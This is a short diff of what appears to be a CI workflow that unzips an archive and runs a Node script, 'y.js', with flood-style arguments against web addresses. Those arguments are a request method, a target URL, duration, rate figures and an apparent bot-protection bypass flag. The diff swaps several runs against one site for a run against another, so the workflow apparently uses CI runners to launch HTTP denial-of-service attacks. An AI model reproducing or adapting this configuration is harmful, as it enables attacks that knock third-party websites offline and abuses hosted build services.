@@ -35,9 +35,7 @@ jobs:
           cd ideal-guide
           unzip Fc-main.zip
           cd Fc-main
-          screen -dms ve node y.js GET https://thecountbot.lol/6901966783-1a4f705f-16b7-487b-8325-e9d6a80d4a87 200 4 90 --bfm  --debug 
-          screen -dms ve node y.js GET https://thecountbot.lol/6901966783-1a4f705f-16b7-487b-8325-e9d6a80d4a87 200 4 90 --bfm --debug 
-          node y.js GET https://thecountbot.lol/6901966783-1a4f705f-16b7-487b-8325-e9d6a80d4a87 200 4 90 --bfm --debug 
+          node y.js GET https://black.cat.pegasus-vault.com/ 200 4 90 --bfm --full --debug 
 
           
 
